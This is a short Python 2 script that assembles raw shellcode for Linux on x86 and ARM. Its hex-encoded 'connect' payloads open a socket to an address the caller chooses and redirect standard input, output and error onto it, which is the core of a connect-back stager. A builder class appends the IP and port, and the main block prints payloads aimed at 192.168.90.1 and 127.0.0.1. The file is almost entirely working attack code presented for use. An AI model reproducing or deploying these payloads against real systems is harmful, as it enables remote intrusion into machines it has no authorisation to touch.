#!/usr/bin/python

shellcode_db = dict()

sc = ""
sc += "\xeb\x71\x5e\xb8\x66\x00\x00\x00\xbb\x01\x00\x00\x00\x6a\x00\x6a"
sc += "\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x83\xf8\x00\x7c\x48\x89"
sc += "\xc7\xb8\x66\x00\x00\x00\xbb\x03\x00\x00\x00\x6a\x10\x56\x57\x89"
sc += "\xe1\xcd\x80\x83\xc4\x0c\x83\xf8\x00\x75\x2c\xb8\x3f\x00\x00\x00"
sc += "\x89\xfb\xb9\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb"
sc += "\xb9\x01\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb\xb9\x03"
sc += "\x00\x00\x00\xcd\x80\xeb\x19\xb8\x01\x00\x00\x00\xbb\x00\x00\x00"
sc += "\x00\xcd\x80\xe8\x8a\xff\xff\xff\x02\x00\x04\xd2\x7f\x00\x00\x01"
sc += "\xeb\xfe"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "x86" not in shellcode_db["linux"]: shellcode_db["linux"]["x86"] = dict()
if "unoptimized" not in shellcode_db["linux"]["x86"]: shellcode_db["linux"]["x86"]["unoptimized"] = dict()
shellcode_db["linux"]["x86"]["unoptimized"]["connect"] = sc

sc = ""
sc += "\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\xff\x70\xa0\xe3"
sc += "\x1a\x70\x87\xe2\x00\x00\x00\xef\x00\x00\x50\xe3\x15\x00\x00\xba"
sc += "\x00\x40\xa0\xe1\x04\x00\xa0\xe1\x54\x10\x8f\xe2\x10\x20\xa0\xe3"
sc += "\xff\x70\xa0\xe3\x1c\x70\x87\xe2\x00\x00\x00\xef\x00\x00\x50\xe3"
sc += "\x0c\x00\x00\x1a\x04\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x04\x00\x00\xea\x00\x00\xa0\xe3\x01\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x02\x00\x04\xd2\x7f\x00\x00\x01\xfe\xff\xff\xea"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "arm" not in shellcode_db["linux"]: shellcode_db["linux"]["arm"] = dict()
if "unoptimized" not in shellcode_db["linux"]["arm"]: shellcode_db["linux"]["arm"]["unoptimized"] = dict()
shellcode_db["linux"]["arm"]["unoptimized"]["connect"] = sc

import bin2py
import socket
import struct

class shellcode:
	def __init__(self, platform, architecture, optimization="unoptimized"):
		self.platform = platform
		self.architecture = architecture
		self.optimization = optimization
		self.code = ""
	def connect(self, ip, port):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["connect"]
		self.code += self.connect_parameters(ip, port)
		return self
	def connect_parameters(self, ip, port):
		return struct.pack("!H", port) + socket.inet_aton(ip)
	def helloworld(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["hello"]


if __name__ == "__main__":
	s = shellcode("linux", "arm").connect("192.168.90.1", 1234)
	print bin2py.print_shellcode(s.code, "shellcode")
	s = shellcode("linux", "x86").connect("127.0.0.1", 1243)
	print bin2py.print_shellcode(s.code, "shellcode")
